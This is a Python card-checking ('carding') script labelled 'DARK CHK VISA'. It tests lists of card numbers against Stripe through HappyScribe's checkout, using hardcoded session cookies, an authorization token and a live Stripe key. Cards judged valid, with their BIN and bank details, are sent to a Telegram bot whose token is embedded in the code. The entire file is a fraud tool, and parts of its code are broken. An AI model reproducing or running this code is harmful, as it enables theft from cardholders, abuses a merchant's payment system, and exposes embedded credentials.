from click import prompt
import time
import pyfiglet


import requests


import user_agent


logi = (pyfiglet.figlet_format(' D  A   R   K    '))

global countN
countN=0
print('\033[1;31m'+logi)


print('\033[1;30m='*60)


logq = (pyfiglet.figlet_format('    C  H  K  VISA'))


print('\033[1;33m'+logq)


token = "6977880996:AAG82nPm1PMgbqlJb-KpV_MJwzZx8ZUsstk"
Id = "1096017603"
print("1. Card \t 2. File")
choice = int(input("\n"))
if (choice == 1):
    cc = input("Card Detail : ")
    c = cc.split('|')[0]

    m = cc.split('|')[1]

    y = cc.split('|')[2]

    cv = cc.split('|')[3]
elif (choice == 2):
    fname = input("file name : ")
    file = open("C:\\Users\\hii\\Programming\\Telegram\\Stripe\\" +fname, 'r').read().splitlines()
for i in file:
    countN=countN+1
    cc = i.split('\n')[0]

    c = cc.split('|')[0]

    m = cc.split('|')[1]

    y = cc.split('|')[2]

    cv = cc.split('|')[3]
    

    def getkey():
     url = 'https://api.stripe.com/v1/payment_methods'
     head = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': str(user_agent.generate_user_agent),
        }
     data = f'type=card&billing_details[name]=Ekdmdm&card[number]={c}&card[cvc]={cv}&card[exp_month]={m}&card[exp_year]={y}&guid=37d94b84-63e3-4654-8276-751a10c76d2105d7dd&muid=83945ecf-6cde-43b8-bd7b-92659ec095b808adf3&sid=27b08ce8-4992-40e1-9f47-3012b0b4c67cdd32e9&payment_user_agent=stripe.js%2Fbef5cfe0f1%3B+stripe-js-v3%2Fbef5cfe0f1%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=46116&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZpOPsY8RtkAg_regLe0HNLjuOL2Za7YDrXoc0jzGthmPbx2aNRqjWjTSfvlzwqV70NsLpnpg908a57cm1cSMLizVWOrIJeI1oCiwgGKjrw2gUlmVPhP5PWJYvpaJ0SrtaosOuX-82v8NDTK8dloDmmucbR8GThiy7EfojFU5LsfGEcRtWPjyjPW7Ja-4-hBq5mViQCWx3NiRwwkn1FnN3nXIo6TBkYQDUIEDFahlH0qHCxvSbUiVvHjYUpXmHkwXOTJN9Pt_WNQkzevPJip4yhlqs604O1P7xbpEqskZV1dm_OXB_k1YqlN5h_Qwg5U0JpFEeA4IGJQXgpbqRs5uoK71pW489XlZG1qHyq1YQEIJ9zG_Sycf6eeOkxUUeKyKQiAAZ2uZB2LccMoNhyl12nbLqNvSa4XGxpFtisL-6EgeZkYTi5jzxLRhQqKZQatQRniPJQFjtkZo1vgGevrx8r5k1YjFV2rQhW_1gIbaAymk8f7-82Ag-XIIVCS8-wv1JmZWn1M0LTjO81OzC9mFe2_Al6uM2yV6ktyiLXJQa9NnfQC15wKn6gMMejOzINVlXhMCMbqPV5gNuqGo-v_PHzqPSGhDwusmkTv3XsbmEr4j4ih-xATflhxleAYTUBw3yFAcLa5KHlG5pERy_7AxJJpBAA9ZZ1EAaOCEIaDMCQmfPUm6ayZR3nlwWy2Qh6w5poBxd-qpg1Hw-7qHckjs5uLVzIrsQvTWkNewKAtTpjjHV6YyWuWx4y9ZVShAfRrUPagZ_EpGmrk1uJrR-3WQIUZ6wwLC6xrFbYgcLRg0lNcNFmqdj8WVWN_qroEAN_ZhZQGCNXlxK8PE70lJS_Krsv3fFCgeatYDKo_wEy91rmLMZqjCJDnHKsVMP35E4_F9eLxuNGhwYe7GaRkGtP00XSYU0Vf5ElTbigMVHKIJ3YQWl8v5ETPFTsg0Ok8dsIwGgsvvuPuBZguJtPw6p_IQV1kHG8PS2oomyHjHb1M_rwSg-jZ2XxHTwRnUSszb6a8wwyh8JByayz1wwtcgAEn8UO5gvMc5AP5VXfnMxeKQg_yVgDMo0Li8rnb6H5XpqqexWhaTV3YvGCO6NmfrYucklu3zxOzRM4ICehdUrlIaKXX1lbtjmfDjMlfByHxrx1XXxw6c-osbTO0P2XU7CFt0gYJ90JLzVtw_ES69I8TJMXMLrDhDtyyChWZV2cGKoqvBY9QixDEQTgdtQ7ITfLJtOAqcL-GJSpa5kVKEDv923KacIovlEQ1DjjibSfewfdePCwWldb4qFeOGyNDBQveVP2XmE3AU5HoL6m-PGszj0Q6g1JL7bbBu_dg-KLYRGTOeQbq09ETZBGC_3k1yblc4D9lvfpU70fmgGJCbWuv1T_mQcjUbgZCWITaNDgEnODuv7sQqLIIioztkCvmRdyBhQI3fgQt1r7OO6A3eooiYfAm7HQ6ULD9j8EDizGnSxrskSvSxGumR5qDXPkGfH-Xnos16q2c32xrA2OLIikay7YGHaYDAy-LVjdX923eCm8d1-tWDLCaZuMs2vvDOkrf7h1du9kebg49pl4g2-LqA7uVJ5NjKPMaKMMbdroTgUt5E_9vIynlG0BbVAer04Nj_N7cM8T-RvTWMey3MoYFPN_kxpBdFjIiki5sbpdEBl8fU8KDVc5KU-AXlYQcDBEMl8MNQXwUUhc3t5KnIxP00R-Mx8Fwn-XB8kDNH4V1bWk_pEa8D2XCgGKBnIIjZSJmrMaQfj_Xjs7wN6Ffs0nF6JqOT9EuLtHoPiXYszHhwgTxH02bpUWehH3TJ1KW1jSC3QuHWMqsNT0cdLgskfz2FVD3Iq4lflvn3uVBUUTVoIDBKS52sdxEsczASUzE5fgAPf8_SrtHurj3sabbUpSRxv6NYeiPu2WW1ep7XPgB8KrSTLoJQxiQvkg55J3KdNlGqYMqrCD64pnYLjAO67PXZ32CgIZO-mDhTfnziIZpUNr3LB0Mc5bymh7dX0x0qhLuhww02TLhzZiBKSiTzomSAazHoVjegp0dlBZ_CK303DqMYnBdfhBVUUKZFTwT8YdqjFbIGm7qVTz0DJJ_NY2jZiIhzIgWsA4sbL0ZpQDzVWPLGL5Mrb6JqxS7qwm9fDgFxbKytVYZIuEKV0FewKh1ZmAXceiLSwC1fnD4G3wo92qK2_IvOUcmc6s5xado2V4cM5mfoyzqHNoYXJkX2lkzgMxg2-ia3KoM2M1OTAwMGWicGQA.tESbNIM3vSqlKTFrqbmcw8Dr8-qu1Z-gwdd2id-SHzc'
     req = requests.post(url, headers=head, data=data)
     if 'id' in req.json():

            return req.json()['id']
     else:

            return 'ID'

    def kilstripe():
        cookies = {
            'timezone': 'Asia%2FBaghdad',
            'ahoy_visit': '315a68ed-1102-4a82-b2da-225a5627dbf6',
            'ahoy_visitor': '7555e3da-9899-4e95-853c-da447e0e2cc5',
            'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-06-28T09%3A52%3A18.206Z%22%2C%22consentId%22%3A%222487a068-5e14-44aa-bcab-9bb89df151ad%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-06-28T09%3A52%3A18.206Z%22%7D',
            '_gcl_au': '1.1.1175269806.1719568338',
            '_gid': 'GA1.2.311117659.1719568338',
            'intercom-device-id-frdatdus': '955be6fc-9d3f-437e-84d7-184eef41a526',
            '__stripe_mid': '83945ecf-6cde-43b8-bd7b-92659ec095b808adf3',
            '__stripe_sid': '27b08ce8-4992-40e1-9f47-3012b0b4c67cdd32e9',
            '_cioid': '12337461',
            'user_id': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ik1USXpOREUyT1RjPSIsImV4cCI6bnVsbCwicHVyIjoiY29va2llLnVzZXJfaWQifX0%3D--0938d7e61505fbd347066968ce4b6a5596484422',
            'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNak0wTVRZNU4xMHNJbmhwYzJWVWVVMXlZM0J6Y1VSVldFUjRlazV2SWl3aU1UY3hPVFUyT1RReU1DNDJNVE01TWpRMUlsMD0iLCJleHAiOiIyMDI0LTA3LTA1VDEwOjEwOjIwLjYxM1oiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--fb168cce19ae9084619253189af5d622e790a6ab',
            'unsecure_is_signed_in': '1',
            '_ga': 'GA1.2.1352346094.1719568337',
            'intercom-session-frdatdus': 'MnlSeHlVU3RJSWhEejhwVFNLMEw2R1ZHdER3c3Q5allPRXVpUlhwbjBDSUFoL2dJK0lXRTJxZDhoUmRSWExyYi0tcWhiQlBWd3lYRnh4RXlwZjJwSGpSUT09--87f18a65300dd2a02ae77bae00a3430af14a1fea',
            '_ga_4T8KCV9Y2D': 'GS1.1.1719568337.1.1.1719569461.23.0.0',
            '_transcribe_session': '%2BQhE%2FZH185bIPQ8a6%2Bf37ss5A9pnM%2Fs%2F%2Fp1J82Hr8TRWRuBLYeeg5yvvH2as4w%2BT2cv0TC7Q1w759DETnxmDXtvLiej%2FQKVkjaFlILaaPG37LdTpBuueYvfDUJj24NiMUC7WkrGMUVT70%2BjE7ZL%2B0Y0JwZ%2B22v7B55dwbj0QCyDRXrlxB2mpHkIzDW%2FRyOqA3YLVgyGPpLzKG1Z7xFDamNg80OAWM3IOsQZCnZ%2BatTy2kHEu3d%2FuBZJFvxaw9Ry79mYqIetDL0vVh6ZfwdFN5%2BFE5iSbtjY7YIuB58Fbx0o43kZOFnmeZHZXbg3DfH8NxIF3NT2WDbzadyy5YYqp%2BY6DIdjGXCwaDfabIFH8sfccgOQGu%2Fd8qkgVX%2FYSu2j0rMLCd92m%2B8KOSSeDdfrFxWxsbw%3D%3D--4b9%2BxTZ%2FcBFXSKZJ--e9hI5fgPoS%2FxRV1Nbus2CQ%3D%3D',
        }

        head = {
            'authority': 'www.happyscribe.com',
            'accept': 'application/json',
            'accept-language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': 'Bearer cPk4WAI97ukY5wwY2ucQYAtt',
            'content-type': 'application/json',
            #'cookie': 'timezone=Asia%2FBaghdad; ahoy_visit=315a68ed-1102-4a82-b2da-225a5627dbf6; ahoy_visitor=7555e3da-9899-4e95-853c-da447e0e2cc5; cc_cookie=%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-06-28T09%3A52%3A18.206Z%22%2C%22consentId%22%3A%222487a068-5e14-44aa-bcab-9bb89df151ad%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-06-28T09%3A52%3A18.206Z%22%7D; _gcl_au=1.1.1175269806.1719568338; _gid=GA1.2.311117659.1719568338; intercom-device-id-frdatdus=955be6fc-9d3f-437e-84d7-184eef41a526; stripe_mid=83945ecf-6cde-43b8-bd7b-92659ec095b808adf3; stripe_sid=27b08ce8-4992-40e1-9f47-3012b0b4c67cdd32e9; _cioid=12337461; user_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ik1USXpOREUyT1RjPSIsImV4cCI6bnVsbCwicHVyIjoiY29va2llLnVzZXJfaWQifX0%3D--0938d7e61505fbd347066968ce4b6a5596484422; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNak0wTVRZNU4xMHNJbmhwYzJWVWVVMXlZM0J6Y1VSVldFUjRlazV2SWl3aU1UY3hPVFUyT1RReU1DNDJNVE01TWpRMUlsMD0iLCJleHAiOiIyMDI0LTA3LTA1VDEwOjEwOjIwLjYxM1oiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--fb168cce19ae9084619253189af5d622e790a6ab; unsecure_is_signed_in=1; _ga=GA1.2.1352346094.1719568337; intercom-session-frdatdus=MnlSeHlVU3RJSWhEejhwVFNLMEw2R1ZHdER3c3Q5allPRXVpUlhwbjBDSUFoL2dJK0lXRTJxZDhoUmRSWExyYi0tcWhiQlBWd3lYRnh4RXlwZjJwSGpSUT09--87f18a65300dd2a02ae77bae00a3430af14a1fea;_ga_4T8KCV9Y2D=GS1.1.1719568337.1.1.1719569461.23.0.0; _transcribe_session=%2BQhE%2FZH185bIPQ8a6%2Bf37ss5A9pnM%2Fs%2F%2Fp1J82Hr8TRWRuBLYeeg5yvvH2as4w%2BT2cv0TC7Q1w759DETnxmDXtvLiej%2FQKVkjaFlILaaPG37LdTpBuueYvfDUJj24NiMUC7WkrGMUVT70%2BjE7ZL%2B0Y0JwZ%2B22v7B55dwbj0QCyDRXrlxB2mpHkIzDW%2FRyOqA3YLVgyGPpLzKG1Z7xFDamNg80OAWM3IOsQZCnZ%2BatTy2kHEu3d%2FuBZJFvxaw9Ry79mYqIetDL0vVh6ZfwdFN5%2BFE5iSbtjY7YIuB58Fbx0o43kZOFnmeZHZXbg3DfH8NxIF3NT2WDbzadyy5YYqp%2BY6DIdjGXCwaDfabIFH8sfccgOQGu%2Fd8qkgVX%2FYSu2j0rMLCd92m%2B8KOSSeDdfrFxWxsbw%3D%3D--4b9%2BxTZ%2FcBFXSKZJ--e9hI5fgPoS%2FxRV1Nbus2CQ%3D%3D',
            'origin': 'https://www.happyscribe.com',
            'referer': 'https://www.happyscribe.com/v2/11843946/checkout?new_subscription_interval=month&plan=basic_2023_05_01&step=billing_details',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'id': 11523018,
            'address': 'Los Angeles ',
            'name': 'Ekdmdm',
            'country': 'US',
            'vat': '10080',
            'billing_account_id': 11523018,
            'orderReference': 'nnowdiix',
            'user_id': 12341697,
            'organization_id': 11843946,
            'hours': 0,
            'balance_increase_in_cents': None,
            'payment_method_id': getkey(),
            'transcription_id': None,
            'plan': 'basic_2023_05_01',
            'order_id': None,
            'recurrence_interval': 'month',
            'extra_plan_hours': None,
        }
        print(f"==========LOADING======" )
        time.sleep(20)
        req = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment',cookies=cookies, headers=head, json=data)
        if req.status_code==200:
            try:
                        
                        if "Your card has insufficient funds." in req.json()['error']:

                            api = requests.get(
                                f'https://lookup.binlist.net/{cc[:6]}').json()

                            try:

                                chh = api['scheme']

                                ch = chh.upper()

                            except:

                                ch = 'False'

                            try:

                                typ = api['type']

                                type = typ.upper()

                            except:

                                type = 'False'

                            try:

                                raa = api['brand']

                                ra = raa.upper()

                            except:

                                ra = 'False'

                            try:

                                am = api['bank']['name']

                                ame = am.upper()

                            except:

                                ame = 'False'

                            try:

                                co = api['country']['name']

                                cou = co

                            except:

                                cou = 'False'

                            try:

                                emoji = api['country']['emoji']

                            except:

                                emoji = 'False'

                            m = f'''
            {countN} : Live Card ✅
            - - - - - - - - - - - - - - - - - - - - - - -
            CC -> {cc}
            Gateway -> Stripe .
            Response -> Your card has insufficient funds.
            - - - - - - - - - - - - - - - - - - - - - - -
            Bin -> {cc[:6]}
            Bin Info -> {ch} - {type} - {ra}
            Bank -> {ame}
            Counrty -> {cou} {emoji}
            - - - - - - - - - - - - - - - - - - - - - - -
            '''
                            requests.get("https://api.telegram.org/bot"+str(token) +
                                        "/sendMessage?chat_id="+str(Id)+"&text="+str(m))

                            bolnam = 'visaok.txt'

                            open(bolnam, 'r').write('\n'+m)

                            print(f'''\033[1;32m {m}''')

                           

                        else:

                            print(f'''\033[1;31m
            {countN} : Visa is Declined ✗
            Visa = {cc}
            Message = {req.json()["error"]}''')

                            

            except:

                        if 'Retry later' in req.text:

                            print(f'''\033[1;31m{countN} : {cc} | Retry later''')

                           

                        elif 'requires_action' in req.json():

                            requir = (f'''\033[1;33m {countN} : Visa :
            Visa is Live 3D Secure ✓
            Visa = {cc}''')

                            print(requir)

                            requests.get("https://api.telegram.org/bot"+str(token) +
                                        "/sendMessage?chat_id="+str(Id)+"&text="+str(requir))

                            time.sleep(2)

                        else:

                            api = requests.get(
                                f'https://lookup.binlist.net/{cc[:6]}').json()

                            try:

                                chh = api['scheme']

                                ch = chh.upper()

                            except:

                                ch = 'False'

                            try:

                                typ = api['type']

                                type = typ.upper()

                            except:

                                type = 'False'

                            try:

                                raa = api['brand']

                                ra = raa.upper()

                            except:

                                ra = 'False'

                            try:

                                am = api['bank']['name']

                                ame = am.upper()

                            except:

                                ame = 'False'

                            try:

                                co = api['country']['name']

                                cou = co.upper()

                            except:

                                cou = 'False'

                            try:

                                emoji = api['country']['emoji']

                            except:

                                emoji = 'False'

                            m = f'''
            {countN : }Approved Card ✅
            - - - - - - - - - - - - - - - - - - - - - - -
            CC -> {cc}
            Gateway -> Stripe .
            Response -> Thank You For Sell.
            - - - - - - - - - - - - - - - - - - - - - - -
            Bin -> {cc[:6]}
            Bin Info -> {ch} - {type} - {ra}
            Bank -> {ame}
            Counrty -> {cou} {emoji}
            - - - - - - - - - - -- - - - - - - - - - - -
            '''

                            requests.get("https://api.telegram.org/bot"+str(token) +
                                        "/sendMessage?chat_id="+str(Id)+"&text="+str(m))
                            bolnam = 'visaok.txt'

                            open(bolnam, 'a').write('\n'+m)
                            print(f'''\033[1;32m{m}''')

                            time.sleep(2)
        else:
            if req.status_code!=200:
                print(f"API return Status : {req.status_code} \n {req}")
            else:
                print(f"Unexpected content type: {req.headers['Content-Type']}")
    kilstripe()
